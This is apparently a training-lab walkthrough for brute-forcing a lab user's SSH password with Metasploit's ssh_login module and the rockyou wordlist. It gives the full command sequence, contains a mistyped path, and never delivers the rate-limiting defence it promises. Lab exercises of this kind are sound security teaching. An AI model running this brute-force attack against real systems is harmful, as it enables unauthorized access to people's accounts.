# SSH Brute Force Lab
This lab Takes step 2 and 3 of the cyber kill chain, Weaponization. In this lab we will be attempting to use a tool to brute force the SSH service of our target linux server with the target of bob. Based on OSINT we know this individual has been breached in the past and we can get their password likely in the rockyou database.

We will also talk preventions here since I'm very oriented to the blue team side of cybersecurity, and this is a great time to talk ratelimiting

---
## Required Materials
- Setup lab


---
1. Login and access the kali linux machine

2. Prepare the wordlist
We need to obtain the password wordlist we are going to use for this brute force
```sh
cd /usr/share/wordlists
gunzip ./rockyou.txt.gz
# Lets see how many passwords are in here!
wc -l /usr/share/wordlists/rockyou.txt 
```

We are going to create the directory and track our items in a new directory to help with logging.
```sh
mkdir -p ~/labs/ssh-brute
cd ~/labs/ssh-brute
# We will use this in case we wish to log any parts of our attack.
```

3. See the help menu for metasploit console
Metaspolit is a very common tool with easy explots that allow you to attack a target. We will be using it's ability to brute force 

```sh
msfconsole
search ssh
use auxiliary/scanner/ssh/ssh_login 
show options
set RHOST <Target IP>
set PASS_FILE /use/share/wordlists/rockyou.txt
set USERNAME bob

# Ensure options are set
show options
# Executing the attack
run
```

This may take some time to proceed through the list. Wait until it has finished before proceeding. 

---
## Conclusion